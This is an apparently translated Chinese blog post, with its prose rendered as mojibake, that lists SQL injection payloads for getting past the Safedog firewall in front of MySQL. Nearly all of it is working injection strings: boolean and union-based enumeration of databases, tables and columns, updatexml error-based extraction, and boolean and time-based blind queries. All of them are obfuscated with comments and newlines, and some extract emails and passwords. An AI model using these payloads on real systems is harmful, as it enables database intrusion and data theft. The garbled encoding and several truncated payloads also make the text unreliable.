# Bypass MySQL Safedog
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
è·Ÿå›¢é˜Ÿå°ä¼™ä¼´ä¸€èµ·æ—¥ç‹—
## åˆ¤æ–­æ³¨å…¥
å®‰å…¨ç‹—ä¸è®©åŸºæœ¬è¿ç®—ç¬¦åè·Ÿæ•°å­—å­—ç¬¦ä¸²
ç‰¹æ®Šè¿ç®—ç¬¦ç»•
     -1=-1 -- + æ­£å¸¸
     -1=-2 -- + ä¸æ­£å¸¸
     ~1=~1 -- + æ­£å¸¸
     ~1=~2 -- + ä¸æ­£å¸¸
16è¿›åˆ¶ç»•
     and 0x0 <> 0x1-- +    æ­£å¸¸
     and 0x0 <> 0x0-- +    ä¸æ­£å¸¸
     and 0x0  0x0-- +   æ­£å¸¸
     and 0x0  0x1-- +   ä¸æ­£å¸¸
     and 0x0 xor 0x1-- +   æ­£å¸¸
     and 0x0 xor 0x0-- +   ä¸æ­£å¸¸
BINARYç»•
     and BINARY 1-- +  æ­£å¸¸
     and BINARY 0-- +  ä¸æ­£å¸¸
conv()å‡½æ•°ç»•
     and CONV(1,11,2)-- +  æ­£å¸¸
     and CONV(0,11,2)-- +  ä¸æ­£å¸¸
concat()å‡½æ•°ç»•
     and CONCAT(1)-- +     æ­£å¸¸
     and CONCAT(0)-- +     ä¸æ­£å¸¸
## åˆ¤æ–­å­—æ®µæ•°
ç»•order by
å†…è”
     by*/ 3 -- +
æ³¨é‡Šæ¢è¡Œ
     3 -- +
## è”åˆæŸ¥è¯¢
å…³é”®åœ¨äºæ‰“ä¹±union select
å†…è”
     /*!14440union*//*!14440select */1,2,3 -- +
æ³¨é‡Šåè·Ÿåƒåœ¾å­—ç¬¦æ¢è¡Œ
     1,2,3--+
union distinct | distinctrow | all
     union distinct %23%0aselect 1,2,3 -- +
     union distinctrow %23%0aselect 1,2,3 -- +
     union all%23%0aselect 1,2,3 -- +
æ¥ä¸‹æ¥æ˜¯æŸ¥æ•°æ®ï¼Œæˆ‘åœ¨è¿™ä½¿ç”¨æ³¨é‡Šåƒåœ¾å­—ç¬¦æ¢è¡Œä¹Ÿå°±æ˜¯%23a%0açš„æ–¹æ³•æ¥ç»•ï¼Œä½ å¯ä»¥ç”¨ä¸Šé¢è¯´çš„/*!14440*/å†…è”
æŸ¥å½“å‰æ•°æ®åº“å
     union %23chabug%0a select 1,database%23%0a(%0a),3 -- +
æŸ¥å…¶ä»–åº“å å®‰å…¨ç‹—4.0é»˜è®¤æ²¡å¼€information_schemaé˜²æŠ¤çš„æ—¶å€™å¯ä»¥è¿‡ï¼Œå¼€äº†information_schemaé˜²æŠ¤ä¹‹åç»•ä¸è¿‡å»ï¼Œå“­å”§å”§ğŸ˜­
     union %23asdasdasd%0a select 1,(select schema_name from %23%0ainformation_schema.schemata  limit 1,1),3 -- +
æŸ¥è¡¨å
     union %23asdasdasd%0a select 1,(select table_name from %23%0ainformation_schema.tables where table_schema=database(%23%0a) limit 1,1),3 -- +
æŸ¥åˆ—åï¼Œé¦–å…ˆæ˜¯æ²¡å¼€information_schemaé˜²æŠ¤æ—¶
     union %23a%0a select 1,(select column_name from %23%0a information_schema.columns where table_name=0x7573657273 and%23a%0a table_schema=database(%23%0a) limit 1,1),3 -- +
å¼€information_schemaé˜²æŠ¤æœ‰ä¸¤ç§å§¿åŠ¿ï¼Œä¸è¿‡éœ€è¦çŸ¥é“è¡¨å
ä¸€ã€å­æŸ¥è¯¢
     union %23a%0a SELECT 1,2,x.2 from %23a%0a(SELECT * from %23a%0a (SELECT 1)a, (SELECT 2)b union  %23a%0aSELECT *from  %23a%0aemails)x limit 2,1 -- +
äºŒã€ç”¨joinå’Œusingçˆ†åˆ—åï¼Œå‰ææ˜¯é¡µé¢å¯ä»¥æŠ¥é”™ï¼Œéœ€è¦å·²çŸ¥è¡¨å
     union %23a%0aSELECT 1,2,(select * from %23a%0a(select * from %23a%0aemails a join emails b) c) -- +
ç„¶åé€šè¿‡usingæ¥ç»§ç»­çˆ†
     union %23a%0aSELECT 1,2,(select * from %23a%0a(select * from %23a%0aemails a join emails b using(id)) c) -- +
æŸ¥æ•°æ®
     union %23a%0aSELECT 1,2,(select email_id from%23a%0a emails limit 1,1) -- +
å…¶å®é…åˆMySQL5.7çš„ç‰¹æ€§å¯ä»¥ä½¿ç”¨sysè¿™ä¸ªåº“æ¥ç»•è¿‡ï¼Œå…·ä½“çœ‹chabugå‘çš„æ–‡ç« å§
[æ³¨å…¥bypassä¹‹æ¶ç‹—å¼€é”ç ´ç›¾](https://www.chabug.org/web/1019.html)
> åœ¨ä¸‹æ–‡ä¸­ä¸å†æåŠå¼€å¯information_schemaé˜²æŠ¤çš„ç»•è¿‡å§¿åŠ¿ï¼Œè‡ªè¡Œä¸¾ä¸€åä¸‰ã€‚
## æŠ¥é”™æ³¨å…¥
æŠ¥é”™æ³¨å…¥åªæåŠupdatexmlæŠ¥é”™
å…³é”®åœ¨äºupdatexml()ç»“æ„æ‰“ä¹±
    and updatexml(1,1,1     ä¸æ‹¦æˆª
    and updatexml(1,1,1)    æ‹¦æˆª
ä¸è®©updatexmlåŒ¹é…åˆ°ä¸¤ä¸ªæ‹¬å·å°±è¡Œäº†
ç”¨æˆ·å åº“å
     and updatexml(1,concat(0x7e,user(/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
     and updatexml(1,concat(0x7e,database(/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
åº“å
     and updatexml(1,`concat`(0x7e,(select schema_name from %23a%0a information_schema.schemata  limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
è¡¨å
     and updatexml(1,`concat`(0x7e,(select table_name from %23a%0a information_schema.tables where table_schema=database(/*!)*/ limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
åˆ—å
     and updatexml(1,`concat`(0x7e,(select column_name from %23a%0a information_schema.columns where table_schema=database(/*!)*/ and %23a%0atable_name=0x7573657273 limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
æŸ¥æ•°æ®
     and updatexml(1,concat(0x7e,(select email_id from %23a%0a emails limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
## ç›²æ³¨
åˆ†å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨æ¥è¯´å§
### å¸ƒå°”ç›²æ³¨
ä¸è®©ä»–åŒ¹é…å®Œæ•´æ‹¬å·å¯¹
ä½¿ç”¨left()æˆ–è€…right()
     and hex(LEFT(user(/*!)*/,1))=%23a%0a72 -- +
     and hex(right(user(/*!)*/,1))=%23a%0a72 -- +
ä½¿ç”¨substring() substr()
     and hex(SUBSTRING(user(/*!)*/,1,1))=72 -- +
     and hex(substr(user(/*!)*/,1,1))=72 -- +
æŸ¥è¡¨å
     and hex(SUBSTR((select table_name from %23a%0a information_schema.tables where table_schema=%23a%0adatabase%23a%0a(/*!)*/ limit 0,1),1,1))=65-- +
åˆ—åå­—æ®µååŒç†ï¼Œç•¥
### æ—¶é—´ç›²æ³¨
ä¸åŒ¹é…æˆå¯¹æ‹¬å·
sleep()ç»•è¿‡
     and sleep(3/*!)*/-- +
æŸ¥ç”¨æˆ·
      and if%23%0a(left(user(/*!)*/,1/*!)*/=char(114),sleep(3/*!)*/,1/*!)*/ -- +
      and if%23%0a(left(user(/*!)*/,1/*!)*/=0x72,sleep(3/*!)*/,1/*!)*/ -- +
æŸ¥æ•°æ® limitè¿‡ä¸äº†
      and if%23%0a(left((select group_concat(table_name/*!)*/ from%23a%0ainformation_schema.tables where table_schema=database(/*!)*/ /*!)*/,1/*!)*/=0x65,sleep(5/*!)*/,1/*!)*/ -- +
## å…¶ä»–
length()é•¿åº¦
     and length(1)1 -- +
      and length(database(/*!))*/8 -- +
count()
      and  (%23a%0aselect count(password/*!)*/ from %23a%0a users/*!)*/13 -- +
## å‚è€ƒ
æ–‡ç¬”åƒåœ¾ï¼Œæªè¾è½»æµ®ï¼Œå†…å®¹æµ…æ˜¾ï¼Œæ“ä½œç”Ÿç–ã€‚ä¸è¶³ä¹‹å¤„æ¬¢è¿å¤§å¸ˆå‚…ä»¬æŒ‡ç‚¹å’Œçº æ­£ï¼Œæ„Ÿæ¿€ä¸å°½ã€‚